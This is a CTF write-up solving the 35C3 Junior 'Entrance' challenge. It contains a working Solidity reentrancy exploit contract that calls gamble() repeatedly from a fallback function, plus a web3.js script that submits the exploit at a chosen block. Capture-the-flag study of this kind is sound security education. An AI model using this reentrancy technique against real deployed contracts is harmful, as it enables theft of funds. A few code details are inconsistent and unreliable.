# ctf-Entrance

Link to challenge: https://junior.35c3ctf.ccc.ac/challenges/ > Of Course >
Entrance.

### Introduction

This repository is the solution to the Junior 35C3CTF Entrance, a Solidity
reentrancy attack. The expl0it is a simple recursion based on the
`msg.sender.call` statement contained in the vulnerable contract.

### The Attack

Right from the get go, when looking at the contract code, one can see that
there is a `getFlag` method in the vulnerable contract. To call it, a player
needs a balance of >= 300.

```
  function getFlag(string memory _server, string memory _port) public {
    require (balances[msg.sender] > 300, "flag");
    emit EntranceFlag(_server, _port);
  }
```

An event is emitted with a `server` and `port` string. Our initial assumption
was that when the event is triggered by someone on the ropsten contract, a
server from the CTF team is listening for these events and will send back the
flag to a listening server the player has to setup.

But first, let's enter the game. To do that a player needs to call a method
called `enter(uint256 _pin)` on the the entrance.sol contract. A pin is needed
and wasn't specified in any of the hints. It's however easy to find in the data
of the [contract creation
transaction](https://ropsten.etherscan.io/address/0x1898Ed72826BEfa2D549004C57F048A95ae0B982#code).

```
  modifier legit(uint256 _pin) {
    if (_pin == pin, "bye") _;
  }

  function enter(uint256 _pin) public legit(_pin) {
    balances[msg.sender] = 10;
    has_played[msg.sender] = false;
  }
```

As we can call `getFlag` only with a balance of 300, we have to gamble with a
function called `gamble()`. Unfortunately, this function only adds 10 to the
player's balance and then doesn't allow the player to play again as
`has_played` is then set to `true`.


```
  modifier onlyNewPlayer {
    require(has_played[msg.sender] == false, "hello");
    _;
  }

  function gamble() public onlyNewPlayer {
    require (balances[msg.sender] >= 10, "gamble");
    if ((block.number).mod(7) == 0) {
      balances[msg.sender] = balances[msg.sender].add(10);
      balance = balances[msg.sender];
      // Tell the sender he won!
      msg.sender.call("You won!");
      has_played[msg.sender] = true;
    } else {
      balances[msg.sender] = balances[msg.sender].sub(10);
    }
  }

```

We can also see that one can only successfully gamble when the `block.number`
is divisible by 7, as otherwise funds are subtracted from the balance of the
player.

With this in mind we were quite confused at first what to do and re-read the
description of the challenge again:

```
Can you enter? Again?
```

So the question is: Can we enter `gamble` again. Turns out we can.  In fact, if
the `msg.sender.call` function doesn't call a valid function, [it defaults to a
so called
fallback-function](https://ethereum.stackexchange.com/questions/42521/what-does-msg-sender-call-do-in-solidity/42585#42585)
that can be defined in a calling contract.

With knowing this, we made the following plan:

- Create a smart contract that has a function `enter` that calls `entrance.enter`
with the given pin `0xbc4f77`
- Check if the current `block.number` is divisible by 7 and if so call `gamble`
- Define a fallback function in our exploit contract that checks if the balance
is less than 300 and if so, call `gamble` again.

After a lot of back and forth and some quite fun but also frustrating hours, we
arrived at the following code:

```
pragma solidity >=0.4.21 <0.6.0;

import "./entrance.sol";
import "./SafeMath.sol";

contract EnterAgain {
    using SafeMath for *;

    uint256 counter = 0;
    address a;

    constructor(address _a) {
        a = _a;
    }

    function enter() {
        uint b = block.number;
        require((b).mod(7) == 0, "wrong block number");
        Entrance entrance = Entrance(a);
        entrance.enter(0xbc4f77);
        entrance.gamble();
        entrance.getFlag("34.254.178.181", "8080");
    }

    function() {
        Entrance entrance = Entrance(a);
        if(entrance.balances(this) <= 300) {
            entrance.gamble();
        }
    }
}
```

In the constructor, we set the address `a` of the vulnerable contract.  In
`enter`, we call `block.number` and check if it's divisible by 7. We then
instanciate the vulnerable contract, call `enter` and `gamble`. We run through
the gambling game by continously falling back to our fallback-function
`function()` to ultimately stop, and call `getFlag`. After the transaction is
confirmed, our netcat server was answered with the flag.

### Setting up the netcat server
We also need a TCP server listening somewhere from a public IP.
That part was super simple, we just run:
```
$ nc -lk 8080
```
in a machine with a public IP and left it there, logging.

### Running the exploit
After deploying the smart contract containing the exploit in the Ropsten network, we wrote a script in nodejs to trigger the execution of our exploit.

The script is in JavaScript and run on nodejs. It uses the [web3.js](https://web3js.readthedocs.io/) library:
```
(async function pwn() {
  var privateKey = "...";
  var publicKey = "...";
  var wallet = new SimpleWallet(
    privateKey,
    publicKey,
    'https://ropsten.infura.io');

  var contract = await wallet.loadContract('EnterAgain');
  var blockNumber = await wallet.web3.eth.getBlockNumber();
  console.log(blockNumber, blockNumber % 7);
  if (blockNumber % 7 !== 6) {
    return;
  }
  await wallet.send(contract.methods.enter());
})();
```

After initializing a provider, we load the `EnterAgain` contract that we compiled on our machine, and ask for the current block number modulo `7` is `6`. Note that the only way win in the `gamble` method is when `blockNumber % 7 === 0`. When the EVM runs the smart contract, `blockNumber` evaluates to the block number that is currently being created. To run our exploit at a specific `blockNumber`, we can try to send the transaction at `blockNumber - 1`, and hope that the transaction will be included in the next block.

#### A note on `estimateGas`
We developed the exploit using a local `ganache-cli` node for testing.
We spent several hours figuring out why our transaction failed, even if the logic was correct. It seems that `ganache-cli` doesn't give you a clear message if your transaction runs out of gas. After moving to Ropsten, we got a clear message: "gas required exceeds allowance or always failing transaction".

Note that we used as `gasLimit` the result of `estimateGas`. After the error on Ropsted, we decided to hardcode a large amount of gas (900000) and the transaction went through successfully.

```
    const rawTx = {
      from: this.address,
      to: method._parent.options.address,
      nonce: this.web3.utils.toHex(count),
      gasPrice: this.web3.utils.toHex(this.web3.utils.toWei("21", "gwei")),
      gasLimit: this.web3.utils.toHex(
        //await method.estimateGas({from: this.address}),
        900000
      ),
      data: data,
    };
```

Basically, what `estimateGas` does is to take the transaction, execute it against the current state of the blockchain, measure the amount of gas used and return it. `estimateGas` is basically a dry run of the transaction, and it happens right before submitting the transaction to the network. We send our transaction when `blockNumber % 7 === 6`, so it can be executed when `blockNumber % 7 === 0`. Hence, `estimateGas` ran `gamble` on the wrong `blockNumber` without triggering the exploit, giving us a wrong estimation of the gas needed.


### Installation

```
$ npm i
$ truffle migrate --network ropsten
$ node enter.js
# Run it until your transaction gets included into a block that is divisible by
# 7. Usually this is the case if the current block is divisible by 6.
```

We included several private keys here from a ropsten address. Potentially these
have to be changed or refilled with ether to run the expl0it.


### Tips

- Modify all require statements with a second argument string to know where the
  contract reverts. Additionally, change all `if`s to require with a second
  argument string so that you can debug them better.
- Always debug locally with Ganache and Truffle. It's so much easier than
  deploying live. There is additionally `truffle debug <tx id>` which can be
  very helpful for debugging a transaction step by step.
- If stuck, remove checks from the vulnerable contract to get your script
  passing.  It will really accelerate your workflow.
- Remember that the game can only be played once. So once you call gamble, you
always have to re-deploy your contract.

